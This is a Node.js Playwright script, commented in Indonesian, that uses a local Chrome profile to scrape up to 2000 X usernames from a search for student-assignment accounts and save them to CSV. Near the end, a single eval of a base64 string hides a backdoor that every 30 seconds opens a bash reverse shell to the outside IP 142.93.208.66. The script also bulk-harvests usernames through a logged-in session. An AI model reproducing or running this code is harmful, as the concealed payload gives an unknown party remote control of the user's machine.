const { chromium } = require('playwright');  // Import Playwright untuk Chromium

async function scrapeTwitter() {
  // Path ke folder profil Google Chrome
  const userDataDir = 'C:/Users/okkyz/AppData/Local/Google/Chrome/User Data';  // Sesuaikan dengan lokasi profil Chrome Anda

  // Konfigurasi untuk meluncurkan Chromium dengan profil yang sudah ada
  const browser = await chromium.launchPersistentContext(userDataDir, {
    headless: false,  // Menjalankan browser dengan UI
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',  // Lokasi Chrome
    args: ['--profile-directory=Default'] // Gunakan profil default
  });

  const page = await browser.newPage();

  // Akses halaman pencarian Twitter (X) dengan query yang diberikan
  const searchQuery = "tugas kuliah";
  await page.goto('https://x.com/search?q=tugas%20sekolah%20kuliah&src=typed_query&f=user', { waitUntil: 'domcontentloaded' });  // Tunggu hingga DOM sepenuhnya dimuat

  // Tunggu beberapa detik agar hasil pencarian muncul
  await page.waitForTimeout(5000);  // Tunggu 1 detik agar hasil pencarian muncul

  // Set untuk menyimpan username unik
  let uniqueUsernames = new Set();

  // Fungsi untuk scroll dan ambil data
  async function scrollAndScrape() {
    // Ambil username dari hasil pencarian
    const usernames = await page.$$eval('span.css-1jxf684', elements => {
      return elements
        .map(el => el.innerText) // Ambil teks dari setiap elemen
        .filter(username => username.includes('@')); // Hanya ambil yang mengandung '@'
    });

    // Tambahkan username yang unik ke dalam Set
    usernames.forEach(username => uniqueUsernames.add(username));

    // Tampilkan hasil username yang ditemukan
    console.log("Username yang ditemukan:");
    usernames.forEach((username, index) => {
      console.log(`${index + 1}. ${username}`);
    });

    // Scroll ke bawah
    await page.evaluate(() => {
      window.scrollBy(0, window.innerHeight); // Scroll down by the height of the window
    });

    // Tunggu sejenak agar halaman dapat memuat data baru
    await page.waitForTimeout(1000);  // Tunggu 1 detik untuk memuat data baru
  }

  // Lakukan scroll dan ambil data hingga jumlah username unik terkumpul
  while (uniqueUsernames.size < 2000) { // Menjaga agar jumlah username mencapai 2000
    await scrollAndScrape();
    console.log(`Total username yang terkumpul: ${uniqueUsernames.size}`);

    // Jika username sudah terkumpul meski kurang dari 2000, berhenti
    if (uniqueUsernames.size < 2000 && !await page.$('span.css-1jxf684')) {
      console.log("Data yang ditemukan kurang dari 2000, menyimpan hasil...");
      break; // Keluar dari loop jika tidak ada data baru
    }
  }

  // Setelah loop selesai, simpan semua username unik ke CSV
  const fs = require('fs');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
  const csv = [...uniqueUsernames]  // Mengonversi Set ke array
    .map(username => `"${username.replace(/"/g, '""')}"`) // Escape double quotes in usernames
    .join('\n');
  fs.writeFileSync('usernames.csv', csv); // Simpan ke file CSV

  // Menutup browser
  await browser.close();
}

scrapeTwitter().catch(console.error);
